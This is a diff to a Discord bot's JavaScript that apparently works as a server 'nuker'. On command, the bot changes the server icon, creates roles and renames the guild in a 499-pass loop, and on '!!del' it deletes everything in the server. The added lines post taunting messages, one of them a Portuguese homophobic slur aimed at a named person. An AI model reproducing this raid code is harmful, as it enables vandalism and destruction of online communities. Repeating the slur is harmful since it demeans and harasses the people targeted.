@@ -26,6 +26,7 @@ client.on("message", async (message) => {
        let i;
        console.log(`ser humano falou ae meu parcero fode tudo ae men`)
        message.guild.setIcon('./icon.png') 
+	message.channel.send(`henrique bixa`)
 	for(i = 0; i < 499; i++){
         message.guild.createRole('NOOT NOOT')
 	    message.guild.setName(process.env.SERVER_NAME)
@@ -39,6 +40,7 @@ client.on("message", async (message) => {
     if(message.content === '!!del'){
 	    console.log(`ser humano falou ae meu parcero deleta tudo ae men`);
 	    message.delete();
+	    message.channel.send(`oia o lag`);
         server.deleteAll();
 	message.guild.setIcon('./icon.png') 
         const texth = makeid(32);
